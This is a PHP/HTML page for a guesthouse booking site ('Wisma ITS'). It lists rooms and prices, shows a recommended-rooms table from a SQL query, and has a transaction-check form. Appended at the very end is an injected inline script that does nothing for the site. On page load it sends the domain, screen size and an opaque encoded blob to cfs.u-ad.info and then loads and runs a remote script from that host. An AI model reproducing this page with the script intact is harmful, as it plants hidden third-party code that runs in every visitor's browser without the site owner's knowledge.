<?php
  include 'connect.php';
  session_start();

  $query = "select w.nama_wisma as wisma, k.no_kamar as no_kamar, j.nama_jenis as tipe
from (select no_kamar          
      from transaksi_sewa
      group by no_kamar
      having count(*) > (select avg(rata2(5, 2016)) 
                         from transaksi_sewa)) t, kamar k, wisma w, jenis_kamar j
where t.no_kamar = k.no_kamar
and k.id_wisma = w.id_wisma
and k.id_jenis = j.id_jenis
order by w.nama_wisma";
  $query2 = $conn->query($query)->fetchAll();
  
?>


<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Theme The Band</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="bootstrap-3.3.5/dist/css/bootstrap.min.css">
  <link href="http://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css">
  <link href="custom.css" rel="stylesheet" type="text/css">
  <link href="http://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css">
  <script src="jquery.min.js"></script>
  <script src="bootstrap-3.3.5/dist/js/bootstrap.min.js"></script>
</head>

<body id="myPage" data-spy="scroll" data-target=".navbar" data-offset="50">

<nav class="navbar navbar-default navbar-fixed-top">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
    <a class="navbar-brand" href="#myPage">HOME</a>
	</div>
	
    <div class="collapse navbar-collapse" id="myNavbar">
       <ul class="nav navbar-nav navbar-right">
        
		<li><a href="#band">OUR WISMA</a></li>
		<li><a href="#tour">PESAN KAMAR</a></li>
        <li><a href="#contact">CEK TRANSAKSI</a></li>
       </ul>
    </div>
  </div>
</nav>

<!-- Container (The Band Section) -->
<div id="band" class="container text-center">
  <h3>WISMA ITS</h3>
  <p></p>
  <p></p>
  <br>
  <div class="row">
    <div class="col-sm-4">
      <p class="text-center"><strong>WISMA FLAMBOYAN</strong></p><br>
      <a href="#demo" data-toggle="collapse">
        <img src="wisma flambo1.jpg" class="img-circle person" alt="Random Name" width="255" height="255">
      </a>
      
        <p span style="margin-left:50px" class="text-left">
          <b>Kamar Standard Rp250.000<br>
            ->Ruang 2101-2105<br>
          Kamar Eksekutif Rp.500.000<br>
          ->Ruang 2206-2210<br>
          Kamar VIP Rp750.000<br>
          ->Ruang 2311-2315</b>
        </p>
      
    </div>
    <div class="col-sm-4">
      <p class="text-center"><strong>WISMA BOUGENVILLE</strong></p><br>
      <a href="#demo2" data-toggle="collapse">
        <img src="wisma bougen1.jpg" class="img-circle person" alt="Random Name" width="255" height="255">
      </a>
        <p span style="margin-left:50px" class="text-left">
          <b>Kamar Standard Rp250.000<br>
            ->Ruang 1101-1105<br>
          Kamar Eksekutif Rp.500.000<br>
          ->Ruang 1206-1210</b>
        </p>
    </div>
    <div class="col-sm-4">
      <p class="text-center"><strong>WISMA JASMINE</strong></p><br>
      <a href="#demo3" data-toggle="collapse">
        <img src="wisma jasmin1.jpg" class="img-circle person" alt="Random Name" width="255" height="255">
      </a>
        <p span style="margin-left:50px" class="text-left">
          <b>Kamar Tipe Rumah Rp1.000.000<br>
            ->Ruang 3101-3105</b>
        </p>
    </div>
  </div>
</div>

<!-- Container (TOUR Section) -->
<div id="tour" class="bg-1">
  <div class="container">
    <h3 class="text-center">PESAN KAMAR</h3>
    <p class="text-center">Silahkan pilih wisma tempat anda ingin menginap<br><br></p>
    <div class="row text-center">
      <div class="col-sm-4">
        <div class="thumbnail">
          <img src="wisma flambo2.jpg" alt="Paris" width="400" height="300">
          <p><strong>WISMA FLAMBOYAN</strong></p>
          <a href="pesanflamboyan.php"><button class="btn" data-toggle="modal" data-target="#myModal">Pesan Kamar</button></a>
        </div>
      </div>
      <div class="col-sm-4">
        <div class="thumbnail">
          <img src="wisma bougen2.jpg" alt="San Francisco" width="400" height="300">
          <p><strong>WISMA BOUGENVILLE</strong></p>
          <a href="pesanbougen.php"><button class="btn" data-toggle="modal" data-target="#myModal">Pesan Kamar</button></a>
        </div>
      </div>
      <div class="col-sm-4">
        <div class="thumbnail">
          <img src="wisma jasmin2.jpg" alt="New York" width="400" height="300">
          <p><strong>WISMA JASMINE</strong></p>
          <a href="pesanjasmine.php"><button class="btn" data-toggle="modal" data-target="#myModal">Pesan Kamar</button></a>
        </div>
      </div>
      
    </div>
  </div>

  <center><h1>Kamar rekomendasi</h1>
  <div class="container text-center">
    <table class="table table-striped table-bordered">
      <thead>
        <tr>
          <th>Nama Wisma</th>
          <th>Nomor kamar</th>
          <th>Tipe Kamar</th>
        </tr>
      </thead>
      <tbody>
          <?php
            foreach ((array)$query2 as $query3) {
              echo "<tr>";

              echo "<td>";
              echo "$query3[0]";
              echo "</td>";

              echo "<td>";
              echo "$query3[1]";
              echo "</td>";

              echo "<td>";
              echo "$query3[2]";
              echo "</td>";
            }
          ?>
      </tbody>
    </table>
    </div>
   
<div id="contact" class="container">
  <h3 class="text-center">cek transaksi anda</h3>
  <p class="text-center"><em></em></p>

  <div class="row">
  <form method="post" action="phpcektransaksi.php">
    <div class="col-md-8">
		<p>Masukkan Nomor Transaksi:</p>
        <div class="col-sm-6 form-group">
		  <input class="form-control" id="nomor" name="nomor" placeholder="Nomor Transaksi" type="text" required>
        </div>
     </div>
      <br>
      <div class="row">
        <div class="col-md-12 form-group" align=right>
          <input type=submit align=right value=CEK>
        </div>
      </div>	
	</form>
	</div>
  <br>
  
<!-- Footer -->
<footer class="text-center">
  <a class="up-arrow" href="#myPage" data-toggle="tooltip" title="TO TOP">
    <span class="glyphicon glyphicon-chevron-up"></span>
  </a><br><br>
</footer>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bG1S1tyX9ynnua3HywZaW5au0dJcjeaG0UPmL2T27rwZn%2b6xRQxIpwubtwPNQx8yogwIRoFEQf2JRpAbUEaStkniYYB6H%2f9LEFSSalOaOdWu6m403Mptrqd%2fcsKtGlFEQn5PST%2bFSv9G58AmuEIrhk7NzuBdix8fHV7pcYwSZahgSJBFBjgl6dFO3%2bTEqmiaiVvUk8fJGbIFZknCLRVSyO%2fK%2bPRdbKlZkz%2b4NgXIp25SvzPWp1%2b7PxQrct7beBx6jQYQ9tuA2QGX6b0q0xp4CZtrujJ%2f5JHUFgL3fCsCg5wGMTUbEuuHIaSxFBVXLiwg6ckfKk9V9muBDkyYh0yoVNrx1nNNe29j2wGSOypthccjtXMx75eulTmGRSiNyxZvg4xbC%2blSfQiTco9woySzO5WbafqkiJaAk1DPeJf6JkTW0JNbfjqHzkoBaVP8aSEF9oxPkcdPtfJH02i6RiKalRLJU%2be%2fej60%2ffsFwHaGQ4%2bM4EuUqYaWBZoxuFc4%2baALtystWpXZZte3K%2fL5%2bPHWISwHwDwXVEdxdg18MlqeDNb0N%2fASHCtBo%2fg1hQGm6IRafb4uvcL%2f2giw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
